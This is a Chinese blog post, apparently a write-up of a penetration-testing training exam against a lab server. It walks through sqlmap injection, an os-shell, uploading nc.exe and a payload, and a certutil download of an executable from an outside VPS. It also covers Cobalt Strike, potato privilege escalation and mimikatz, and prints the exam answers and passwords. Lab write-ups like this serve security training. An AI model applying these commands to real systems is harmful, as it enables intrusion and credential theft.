@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/qwe/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":10,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="已知：连接vpn访问192.163.3.56">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某次实战考核">
+<meta property="og:url" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/index.html">
+<meta property="og:site_name" content="ChillyBerry&#39;s Blog">
+<meta property="og:description" content="已知：连接vpn访问192.163.3.56">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818122524910.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818122656681.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818123007180.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144145174.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818182614046.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818163328199.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818164507860.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818164350964.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144436579.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818145524551.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818201341674.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144325664.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818194719498.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818190648304.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195320105.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195505981.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195617553.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195811528.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818214811692.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210018564.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210342095.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210615771.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818213537945.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819121849432.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818215550416.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818222026406.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819122858626.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124919347.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124820887.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819125106154.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819123508429.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124231390.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819123822165.png">
+<meta property="og:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819125404863.png">
+<meta property="article:published_time" content="2022-08-18T04:19:42.000Z">
+<meta property="article:modified_time" content="2022-08-19T05:28:55.781Z">
+<meta property="article:author" content="jojo">
+<meta property="article:tag" content="实战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818122524910.png">
+
+<link rel="canonical" href="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>某次实战考核 | ChillyBerry's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ChillyBerry's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="jojo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChillyBerry's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          某次实战考核
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-18 12:19:42" itemprop="dateCreated datePublished" datetime="2022-08-18T12:19:42+08:00">2022-08-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-19 13:28:55" itemprop="dateModified" datetime="2022-08-19T13:28:55+08:00">2022-08-19</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>已知：连接vpn访问192.163.3.56<span id="more"></span></p>
+<h4 id="1、后台端口号是？"><a href="#1、后台端口号是？" class="headerlink" title="1、后台端口号是？"></a>1、后台端口号是？</h4><p>8080<br>nmap扫描端口：nmap -sS 192.163.3.56<br>开放80和8080两个http 试一试8080成功跳转后台</p>
+<img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818122524910.png" alt="image-20220818122524910" style="zoom:50%;">
+
+<img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818122656681.png" alt="image-20220818122656681" style="zoom:50%;">
+
+<h4 id="2、后台密码是？"><a href="#2、后台密码是？" class="headerlink" title="2、后台密码是？"></a>2、后台密码是？</h4><p>123456<br>尝试bp弱口令爆破、万能密码均失败「是被老六改密码了」 后面环境还原：admin&#x2F;123456 一猜就出</p>
+<img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818123007180.png" alt="image-20220818123007180" style="zoom:50%;">
+
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144145174.png" alt="image-20220818144145174"></p>
+<h4 id="3、当前数据库名字是"><a href="#3、当前数据库名字是" class="headerlink" title="3、当前数据库名字是"></a>3、当前数据库名字是</h4><p>RYPlatformManagerDB<br>先想办法getshell或sql注入<br>使用xray扫描管理员登录界面：.&#x2F;xray_darwin_amd64 webscan –listen 127.0.0.1:7777 –html-output 1.html<br>发现userName处存在sql注入 管理员登录页面抓包跑sqlmap 布尔盲注</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818182614046.png" alt="image-20220818182614046"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818163328199.png" alt="image-20220818163328199"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818164507860.png" alt="image-20220818164507860">sqlmap -r 1.txt –current-db 跑出当前数据库：RYPlatformManagerDB</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818164350964.png" alt="image-20220818164350964"></p>
+<h4 id="4、后台用户数为？"><a href="#4、后台用户数为？" class="headerlink" title="4、后台用户数为？"></a>4、后台用户数为？</h4><p>3<br>23个又提交错误「22个也错 最后一个应该是其他学员教的」 后面数据库再看吧 后面看来看去不对 仔细理解题目 后台用户数不会指的就是能登进后台的人吧？3个？ 果然是！</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144436579.png" alt="image-20220818144436579"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818145524551.png" alt="image-20220818145524551"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818201341674.png" alt="image-20220818201341674"></p>
+<h4 id="5、管理员登录IP是？"><a href="#5、管理员登录IP是？" class="headerlink" title="5、管理员登录IP是？"></a>5、管理员登录IP是？</h4><p>182.241.240.216<br>一开始以为是这个172.30.0.46 提交发现错误</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144325664.png" alt="image-20220818144325664"></p>
+<p>进网站系统-后台管理 发现其他两个的代理和管理员的ip都是同一个 猜测本admin也是这个ip bingo！</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818194719498.png" alt="image-20220818194719498"></p>
+<p>由于数据库内容太多 所以还是getshell来看比较方便：–os-shell<br>可知服务器为windows</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818190648304.png" alt="image-20220818190648304"></p>
+<h4 id="6、运维人员的后台登录密码是？"><a href="#6、运维人员的后台登录密码是？" class="headerlink" title="6、运维人员的后台登录密码是？"></a>6、运维人员的后台登录密码是？</h4><p>111111<br>已知管理层有amdin、maoyule1、A00068，运维可能是maoyule1<br>我尝试自己新建了一个超级管理员：admin111&#x2F;123123 从图片可以看出*号密码并不代表位数 不能从位数看maoyule1的密码</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195320105.png" alt="image-20220818195320105"></p>
+<p>从后台日志可以看出一开始都是maoyule1在操作，所以他应该是运维无疑</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195505981.png" alt="image-20220818195505981"></p>
+<p>他确实在操作后台 那么可以尝试bp爆破了 又是123456 但是提交显示错误？？</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195617553.png" alt="image-20220818195617553"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195811528.png" alt="image-20220818195811528"></p>
+<p>难道运维是A00068吗？我又bp了一下 A00068&#x2F;111111 结果真对了……毫无逻辑</p>
+<h4 id="7、数据库用户-sa-的密码是？"><a href="#7、数据库用户-sa-的密码是？" class="headerlink" title="7、数据库用户 sa 的密码是？"></a>7、数据库用户 sa 的密码是？</h4><p>c0FI888SW7hwc0S9Rfb3L2BVPePOD</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">信息收集：</span><br><span class="line">whoami:nt service\mssqlserver</span><br><span class="line">不存在nc.exe wget ping 但有certutil</span><br></pre></td></tr></table></figure>
+
+<p>新建用户但是权限不够</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818214811692.png" alt="image-20220818214811692"></p>
+<p>使用–password命令获取所有曾连接过数据库所有账号的密码：此处行不通<br>打算上传nc.exe用来反弹shell 实在是因为盲注太慢了 先弹回来再说 但这边好像写入失败 似乎是没有写文件的权限？「后面之道是路径写错了」</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --file-write=/Users/chendafa/Desktop/nc.exe --file-dest=C:\\windows\\system32\\nc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210018564.png" alt="image-20220818210018564"></p>
+<p>重新尝试直接开3389吧 一开始3389是关的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看是否开了3389：netstat -an | find &quot;3389&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210342095.png" alt="image-20220818210342095"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开启3389：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>开启失败 可能是因为防火墙没关 后面也没关成功</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210615771.png" alt="image-20220818210615771"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关闭防火墙：netsh firewall set opmode disable </span><br></pre></td></tr></table></figure>
+
+<p>换思路：本机开启cs 建立监听器「ip用vpn分配给本机的地址」 生成马 通过sqlmap上传文件运行 直接上线<br>尝试过certutile方法下载vps上的马 额好像不出网？</p>
+<p>另一种方式：potato系列 在盲注阶段直接提权，写文件至web路径「但是这个盲注阶段web路径你要找的话太费时间了」</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://103.170.73.80/jojo.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818213537945.png" alt="image-20220818213537945"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819121849432.png" alt="image-20220819121849432"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --file-write=/Users/chendafa/Downloads/jojo.exe --file-dest=C:/windows/temp/jojo.exe</span><br></pre></td></tr></table></figure>
+
+<p>这次好像成功上传 因为返回了文件大小 之前失败大概是路径的反斜杠问题 但还是执行不了</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818215550416.png" alt="image-20220818215550416"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --os-cmd=C:/windows/temp/m2.exe</span><br></pre></td></tr></table></figure>
+
+<p>到执行这一步就一直卡在这 cs也没上线「后面知道cs的监听地址弄错了 应该是vpn分配给本机的172……还有后面那个windows的路径要用正斜杠」</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818222026406.png" alt="image-20220818222026406"></p>
+<p>终于成功上线！！！就疯狂注入进程 防止掉线</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819122858626.png" alt="image-20220819122858626"></p>
+<p>至于sa的密码 cs上线之后可以到他web目录下去看数据库配置文件 此前监听的时候出现过一个地址 应该就是web路径<br>前人栽树后人乘凉 这里我就不骑马了</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124919347.png" alt="image-20220819124919347"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124820887.png" alt="image-20220819124820887"></p>
+<p>下载下来一看可不就是有密码了吗</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819125106154.png" alt="image-20220819125106154"></p>
+<h4 id="8、用户administrator桌面上的flag-txt-文件中的内容是？"><a href="#8、用户administrator桌面上的flag-txt-文件中的内容是？" class="headerlink" title="8、用户administrator桌面上的flag.txt 文件中的内容是？"></a>8、用户administrator桌面上的flag.txt 文件中的内容是？</h4><p>flag{DeSkt0pflAg34*}</p>
+<p>尝试访问administrator的桌面文件，提示没有权限，所以尝试提权 potato系列 提权成功获取system权限</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819123508429.png" alt="image-20220819123508429"></p>
+<p>提权成功后就可以进administrator用户的桌面了</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124231390.png" alt="image-20220819124231390"></p>
+<h4 id="9、服务器密码是？"><a href="#9、服务器密码是？" class="headerlink" title="9、服务器密码是？"></a>9、服务器密码是？</h4><p>!@#123qwe</p>
+<p>run mimikatz 成功获取服务器明文密码</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819123822165.png" alt="image-20220819123822165"></p>
+<h4 id="10、修改过的RDP端口是？"><a href="#10、修改过的RDP端口是？" class="headerlink" title="10、修改过的RDP端口是？"></a>10、修改过的RDP端口是？</h4><p>3940</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819125404863.png" alt="image-20220819125404863"></p>
+
+    </div>
+
+    
+    
+    <script src="//sdk.jinrishici.com/v2/browser/jinrishici.js"></script>
+<script>
+  jinrishici.load((result) => {
+    let jrsc = document.getElementById('jrsc');
+    const data = result.data;
+    let author = data.origin.author;
+    let title = '《' + data.origin.title + '》';
+    let content = data.content.substr(0, data.content.length - 1);
+    let dynasty = data.origin.dynasty.substr(0, data.origin.dynasty.length - 1);
+    jrsc.innerText = content + ' @ ' + dynasty + '·' + author + title;
+  });
+</script>
+<div style="text-align: center"><span id="jrsc" >正在加载今日诗词....</span></div>
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%9E%E6%88%98/" rel="tag"># 实战</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/10/CS%E5%92%8CMSF%E8%81%94%E5%8A%A8/" rel="prev" title="CS和MSF联动">
+      <i class="fa fa-chevron-left"></i> CS和MSF联动
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/12/09/bugku-web-writeup/" rel="next" title="bugku_web_writeup">
+      bugku_web_writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E5%90%8E%E5%8F%B0%E7%AB%AF%E5%8F%A3%E5%8F%B7%E6%98%AF%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">1、后台端口号是？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F"><span class="nav-number">2.</span> <span class="nav-text">2、后台密码是？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97%E6%98%AF"><span class="nav-number">3.</span> <span class="nav-text">3、当前数据库名字是</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E5%90%8E%E5%8F%B0%E7%94%A8%E6%88%B7%E6%95%B0%E4%B8%BA%EF%BC%9F"><span class="nav-number">4.</span> <span 